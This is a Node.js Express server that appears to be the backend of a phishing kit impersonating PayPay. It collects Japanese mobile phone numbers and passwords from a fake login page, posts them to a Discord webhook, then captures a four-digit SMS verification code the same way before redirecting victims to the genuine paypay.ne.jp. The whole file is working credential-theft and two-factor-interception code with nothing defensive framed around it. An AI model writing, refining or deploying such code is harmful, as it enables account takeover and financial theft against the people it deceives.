const express = require("express");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static("."));

const webhook = process.env.DISCORD_WEBHOOK;

app.post("/send", async (req, res) => {
  const phone = req.body.name;
  const password = req.body.message;

  const safePhone = typeof phone === 'string' ? phone : '';
  const safePassword = typeof password === 'string' ? password : '';
  const cleanPhone = safePhone.replace(/[- ]/g, '');

  if (!/^(090|080|070|060)/.test(cleanPhone) || !/[A-Z]/.test(safePassword)) {
    return res.redirect("/login.html?error=1");
  }

  try {
    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
            body: JSON.stringify({
        content: `電話番号: ${phone}\nパスワード: ${password}`
})
    });


    const telParam = req.query.tel ? `?tel=${encodeURIComponent(req.query.tel)}` : '';
    
    console.log("送信成功");

    res.redirect(`/sms.html${telParam}`);

  } catch (error) {
    console.error("送信失敗:", error);
    res.status(500).send("エラー");
  }
});

app.post("/send-sms", async (req, res) => {
  const smsCode = req.body.sms_code;
  const safeCode = typeof smsCode === 'string' ? smsCode : '';

  if (!/^\d{4}$/.test(safeCode)) {
    return res.redirect("/sms.html?error=1");
  }

  try {
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `【受信データ】\n認証コード: ${safeCode}`
      })
    });

    console.log("SMSコード送信成功");
    res.redirect("https://paypay.ne.jp"); 

  } catch (error) {
    console.error("SMSコード送信失敗:", error);
    res.status(500).send("エラー");
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});
